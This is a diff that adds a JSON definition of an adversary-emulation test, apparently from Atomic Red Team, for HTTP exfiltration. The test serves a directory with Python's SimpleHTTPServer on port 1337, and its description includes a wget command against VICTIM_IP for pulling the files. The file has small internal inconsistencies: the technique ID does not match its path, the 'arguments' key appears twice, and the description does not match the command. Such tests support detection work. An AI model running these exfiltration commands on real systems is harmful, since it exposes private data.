@@ -1,0 +1,31 @@
+{
+    "name": "Exfiltration Over Alternative Protocol - HTTP",
+    "description": "A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.  Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded. To retrieve the data from an adversary system:\n\n    wget http://VICTIM_IP:1337/victim-file.txt\n",
+    "supported_platforms": [
+        "macos",
+        "linux"
+    ],
+    "arguments": {
+        "data_path": {
+            "description": "Test file to upload",
+            "type": "path",
+            "default": "PathToAtomicsFolder/T1048.002/src/artifact"
+        }
+    },
+    "executor": {
+        "command": "cd #{data_path}\n    python -m SimpleHTTPServer 1337\n\n",
+        "name": "sh",
+        "type": "Command Executor"
+    },
+    "id": "T1048.003",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Exfiltration Over Unencrypted Non-C2 Protocol",
+    "source": "ART",
+    "uuid": "1d1abbd6-a3d3-4b2e-bef5-c59293f46eff",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
